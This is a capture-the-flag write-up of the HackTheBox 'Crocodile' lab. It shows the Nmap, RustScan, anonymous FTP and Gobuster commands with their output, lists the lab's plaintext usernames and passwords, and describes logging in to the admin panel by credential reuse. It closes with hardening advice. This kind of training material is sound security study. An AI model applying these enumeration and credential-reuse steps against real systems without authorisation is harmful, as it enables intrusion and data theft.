# Crocodile (HTB) - Unauthenticated FTP Data Leakage & Hidden Panel Authentication

**Platform:** HackTheBox (Starting Point) | **Target OS:** Linux (Ubuntu) | **Difficulty:** Very Easy  
**Focus:** FTP Anonymous Access, Information Disclosure, Directory Fuzzing (Gobuster), and Credential Reuse.

---

## 🎯 Executive Summary
The "Crocodile" machine highlights the danger of chaining misconfigurations. A poorly secured FTP service allowed unauthenticated anonymous access, exposing administrative credentials stored in plaintext. By concurrently fuzzing the web application directories, we discovered a hidden login portal. Utilizing the exfiltrated credentials, we achieved an authentication bypass, gaining access to the internal administrative dashboard.

---

## 1. Perimeter Enumeration & Service Profiling

We initiated the engagement using `RustScan` for rapid port discovery, followed by an aggressive `Nmap` service and script scan on the discovered ports to extract detailed banner telemetry.

```bash
# Rapid Port Discovery
$ rustscan -a 10.129.67.60 --ulimit 5000
Open 10.129.67.60:21
Open 10.129.67.60:80

# Targeted Service Analysis
$ sudo nmap -sS -sV -sC -p 80,21 10.129.67.60
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 ftp      ftp            33 Jun 08  2021 allowed.userlist
|_-rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Smash - Bootstrap Business Template
```

**Technical Findings:**
The Nmap Scripting Engine (NSE) specifically flagged port 21/TCP (`vsftpd 3.0.3`) as vulnerable to **Anonymous Authentication**. Furthermore, it enumerated the contents of the FTP root directory, revealing two highly suspicious files: `allowed.userlist` and `allowed.userlist.passwd`.

---

## 2. Exploitation: Anonymous FTP Data Exfiltration

We initiated a manual FTP connection to the target. By supplying the username `Anonymous` (with a blank password), the `vsftpd` daemon granted us an interactive command shell. 

```bash
$ ftp 10.129.67.60
Connected to 10.129.67.60.
220 (vsFTPd 3.0.3)
Name (10.129.67.60:hacker): Anonymous
230 Login successful.

ftp> ls
229 Entering Extended Passive Mode (|||44701|)
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp            33 Jun 08  2021 allowed.userlist
-rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd

ftp> get allowed.userlist
ftp> get allowed.userlist.passwd
ftp> exit
```

**Intelligence Review:**
Inspecting the exfiltrated plaintext files revealed a direct mapping of usernames to passwords. This is a severe violation of credential storage security practices.

```text
# allowed.userlist
aron
pwnmeow
egotisticalsw
admin

# allowed.userlist.passwd
root
Supersecretpassword1
@BaASD&9032123sADS
rKXM59ESxesUFHAd
```
*Note: The user `admin` correlates perfectly with the high-entropy password `rKXM59ESxesUFHAd`.*

---

## 3. Web Architecture Fuzzing & Authentication

With valid credentials in hand, we turned our focus to the web application hosted on Port 80. The root page (`/`) presented a static Bootstrap business template with no obvious login vectors.

To uncover hidden administrative endpoints, we utilized `Gobuster` to perform directory and file fuzzing against the webroot.

```bash
$ gobuster dir -u http://10.129.67.60 -w ~/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -t 10 -x php,html,txt
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 58565]
/login.php            (Status: 200) [Size: 1577]
```

**Authentication Attack:**
Gobuster successfully discovered a hidden backend portal at `/login.php`. Navigating to this endpoint presented an authentication form. 

By executing a credential reuse attack using the mapped artifacts from the FTP service (`admin` : `rKXM59ESxesUFHAd`), we successfully authenticated against the PHP backend. This granted us access to the Server Manager Dashboard, compromising the administrative perimeter and yielding the target flag.

---

## 4. Defensive Remediation & Secure Development

To secure this environment against similar attack vectors, the following hardening measures are required:

1. **Disable Anonymous FTP Access:** Within the `/etc/vsftpd.conf` configuration file, explicitly set `anonymous_enable=NO` to prevent unauthenticated data exfiltration.
2. **Secure Credential Storage:** Never store application passwords in plaintext text files on disk. Credentials should be stored in a secured database, cryptographically hashed using robust algorithms (e.g., Argon2, bcrypt) accompanied by unique salts.
